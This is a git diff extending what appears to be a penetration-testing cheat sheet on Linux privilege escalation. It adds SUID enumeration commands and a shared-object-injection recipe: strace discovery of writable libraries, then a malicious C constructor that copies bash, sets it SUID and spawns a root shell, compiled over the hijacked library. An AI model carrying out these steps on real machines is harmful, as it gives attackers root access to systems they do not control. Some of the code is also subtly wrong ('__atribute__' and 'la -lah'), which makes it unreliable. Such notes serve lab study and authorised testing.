@@ -196,6 +196,48 @@
   5. ROOT!
   
 ## Escalation via SUID
+### SUID
+  1. Find files with the SUID set
+  ```bash
+  find / -perm -u=s -type f 2>/dev/null
+  ```
+  2. Check GTFOBins for SUID and find a suitable binary
+  3. Run the code associated with the binary and SUID
+
+### Shared Object Injection
+  1. Identify files with shared objects bit set
+  ```bash
+  find / -type f -perm -04000 -ls 2>/dev/null
+  ```
+  2. Enumerate information related to the binary.
+  ```bash
+  la -lah <path/to/binary>
+  ```
+  3. Run the Binary with strace
+  ```bash
+  strace <path/to/binary> 2>&1
+  ```
+  ```bash
+  strace <path/to/binary> 2>&1 | grep -i -E "open|access|no such file"
+  ```
+  4. Identify what files are opened that are writeable
+  5. Write a malicious C file exploit.c
+  ```C
+  #include <stdio.h>
+  #include <stdlib.h>
+
+  static void inject() __atribute__((constructor)) {
+    system(" cp /bin/bash /tmp/bash && chmod +s /tmp/bash && /tmp/bash -p");
+  } 
+  ```
+  6. compile the malicious exploit.
+  ```bash
+  gcc -shared -fPIC -o <path/to/opened/file_found_with_strace> <path/to/exploit.c>
+  ```
+  7. Run the orignal binary that makes the call
+  8. ROOT!
+  
+  
 ## Escalation via Scheduled Tasks
 ### Check writeable Files and Directories
 ```bash
